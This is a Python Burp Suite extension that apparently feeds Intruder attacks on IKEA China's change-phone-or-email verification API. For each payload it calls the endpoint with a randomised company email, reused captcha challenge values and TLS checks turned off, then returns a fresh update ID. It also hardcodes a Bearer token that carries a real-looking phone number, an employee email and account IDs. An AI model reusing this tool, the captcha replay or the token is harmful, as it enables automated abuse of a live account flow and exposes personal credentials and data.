#!/usr/bin/env python
#coding:gbk
from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
import base64
import json
import re
import urllib2
import ssl
import random 

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        callbacks.setExtensionName("getnewcode")

    def getGeneratorName(self):
        return "getnewcode"

    def createNewInstance(self, attack):
        return getnewcode(attack)

class getnewcode(IIntruderPayloadGenerator):
    def __init__(self, attack):
        tem = "".join(chr(abs(x)) for x in attack.getRequestTemplate())         
        ssl._create_default_https_context = ssl._create_unverified_context 
        getnewcode = 'https://www.ikea.cn/api-ciam-host/idaas/api/bff/v1.2/ciam/user/change_phone_or_email/obtain_code_v2'
        print getnewcode+'\n'
        self.getnewcode = getnewcode
        self.max = 1
        self.num = 0
        self.attack = attack

    def hasMorePayloads(self):
        if self.num == self.max:
            return False
        else:
            return True

    def getNextPayload(self, payload):
        getnewcode_url = self.getnewcode
        email = str(random.randint(1,999999))
        email = 'urey.lou'+email+'@ingka.ikea.com'
        request_body = '{"email":"'+email+'","type":"EMAIL","challenge":"bb162819e33a0aa8611f273cff419284cc","validate":"cb4910c7b814869e26226623dbeecb1f","seccode":"cb4910c7b814869e26226623dbeecb1f|jordan"}'
        print email+'\n'
        print request_body+'\n'
        request_header = {"Host":"www.ikea.cn","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","Source": "NEW_WEB","Authorization":"Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjdlOGJiODlkNDNiNzk1ZDQ4MzZlYjVkZGFjNjJiMWIyUEJSMlFtV3Z4SG8ifQ.eyJzdWIiOiIyMzkxMzIyMzQ3NTEyOTQzMzM3IiwiZ3RwIjoicGFzc3dvcmQiLCJ1bmlvbklkIjoib21ia3QxRVlLTXVqMXh6YWctYTFwWGxDUjdBbyIsImNvb2tpZSI6IiIsInVzZXJfbmFtZSI6IlIyMDIxMDEyNzUwNTU1NyIsImlzcyI6IkNJQU0iLCJwYXJ0eVVJZCI6IjE4QjBFRENCLUY0RDUtMTFlYS04Q0NFLTAwNTA1NjkzNTJGOSIsImNsaWVudF9pZCI6IjdlOGJiODlkNDNiNzk1ZDQ4MzZlYjVkZGFjNjJiMWIyUEJSMlFtV3Z4SG8iLCJmYW1pbHlJZCI6IjYyNzU5ODAzMzg3NzE3NzE0OTAiLCJhdWQiOlsiYXBwX2FwaV9yZXNvdXJjZSIsImJmZl9hcGlfcmVzb3VyY2UiXSwiZ3JhbnRfdHlwZSI6InBhc3N3b3JkIiwidXNlcl9pZCI6IjBhNDU4M2M4ZGIzMmE0MzFlZmNiOGJiNjU1MGNiYTE2aDBFWVpiOTV0cFUiLCJwaG9uZSI6IjEzNTI0OTgzNzY4IiwiYXpwIjoiIiwic2NvcGUiOlsicmVhZCJdLCJleHAiOjE2MjYyNTcyNjUsImp0aSI6IjE5YzBmYTcwLWEyOTUtNGE0ZC04OWVkLTM4MzUzMjEwMGQyMyIsImVtYWlsIjoidXJleS5sb3VAaW5na2EuaWtlYS5jb20iLCJtZW1iZXJJZCI6IjI1NjQ2OTkyNjMiLCJpYXQiOjE2MjU2NTI0NjUsIm5iZiI6MTYyNTY1MjQwNX0.OS3FV2mNL9Vi4MG51oL4p5CXN8WBsOaT0UaHpIMELJbvKsWGNeXwceBKnpAtqnpyjgOGhvs5aDR32kLa_SmKTACGWa4xT6QiK9Rb-tXo5qtvxL9PED5LeYh1wYrBZnsnE3bPOCbFoN_pSi4FpavBFHDgnztTIgm7AoDjJ0jkFgtir4-Nq4YBZINKSa0lNvggj_ODjIlZA9i69mjHiObd6flECbzHVFq2fcoM2I36hP_7fyMrvw4zayIqDsSZHlnnlzDEI572U4DCsCk_wqz6gGaGmy3YbGEMYR_pjYdmUXeaD5arZB0edyoDC77klbQOsbZbxEoZojGu-azCim92dw","Connection":"close"}
        request = urllib2.Request(getnewcode_url,headers=request_header,data=request_body)
        response = urllib2.urlopen(request).read()
        codeId = json.loads(response)["data"]["updateId"]
        return codeId

    def reset(self):
        self.num = 0
        return